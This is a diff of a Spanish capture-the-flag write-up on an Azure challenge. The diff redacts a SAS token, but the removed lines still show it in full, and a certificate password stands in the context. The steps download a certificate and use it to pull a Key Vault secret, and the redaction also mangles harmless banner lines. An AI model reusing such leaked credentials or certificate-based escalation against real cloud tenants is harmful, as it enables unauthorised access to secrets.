@@ -85,7 +85,7 @@ $CertificatePassword = "M3d1Cl0ud25!"
 #### Paso 1: Descargar el certificado
 
 ```bash
-curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/certificadob64delpfx.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D" -o certificadob64delpfx.txt
+curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/certificadob64delpfx.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D" -o certificadob64delpfx.txt
 ```
 
 #### Paso 2: Decodificar de Base64 a PFX
@@ -225,9 +225,9 @@ python3 get_keyvault_secrets.py
 
 **Output**:
 ```
-============================================================
+SECRET_REDACTED_BY_ANTIGRAVITY====================
 Azure Key Vault Secret Retrieval
-============================================================
+SECRET_REDACTED_BY_ANTIGRAVITY====================
 [+] Loading certificate and private key...
 [+] Creating client assertion JWT...
 [+] Requesting access token from Azure AD...
@@ -236,16 +236,16 @@ Azure Key Vault Secret Retrieval
 [+] Found 1 secret(s):
     - flag
 
-============================================================
+SECRET_REDACTED_BY_ANTIGRAVITY====================
 Retrieving secret values:
-============================================================
+SECRET_REDACTED_BY_ANTIGRAVITY====================
 
 [+] Retrieving secret: flag
 [+] Secret value: CTF{k3y_v4ult_pr1v1l3g3_3sc4l4t10n_fr0m_s3rv1c3_pr1nc1p4l}
 
-============================================================
+SECRET_REDACTED_BY_ANTIGRAVITY====================
 Done!
-============================================================
+SECRET_REDACTED_BY_ANTIGRAVITY====================
 ```
 
 ## Vulnerabilidad Técnica
@@ -590,7 +590,7 @@ az monitor metrics alert create \
 
 ```bash
 # 1. Descargar certificado del reto anterior
-SAS="sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
+SAS="sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D"
 curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/certificadob64delpfx.txt?${SAS}" -o cert.txt
 curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/script.ps1?${SAS}" -o script.ps1
 
